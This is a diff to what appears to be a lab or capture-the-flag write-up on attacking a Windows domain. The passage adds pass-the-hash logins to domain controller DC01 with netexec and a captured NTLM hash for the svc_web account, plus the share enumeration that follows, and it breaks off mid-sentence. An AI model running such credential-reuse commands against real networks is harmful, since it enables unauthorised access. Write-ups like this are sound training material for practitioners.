@@ -744,6 +744,30 @@ python3 keytabextract.py ../krb5.keytab
 
 I now have the credentials
 
-```python
+# Initial access on the domain
 
+```python
+nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969'
+SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969
 ```
+
+I can now enumerate the domain more
+
+# Enumeration as `svc_web`
+
+```python
+nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --shares
+SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969 
+SMB         10.1.24.233     445    DC01             [*] Enumerated shares
+SMB         10.1.24.233     445    DC01             Share           Permissions     Remark
+SMB         10.1.24.233     445    DC01             -----           -----------     ------
+SMB         10.1.24.233     445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.24.233     445    DC01             C$                              Default share
+SMB         10.1.24.233     445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.24.233     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.24.233     445    DC01             SYSVOL          READ            Logon server share
+```
+
+Only de
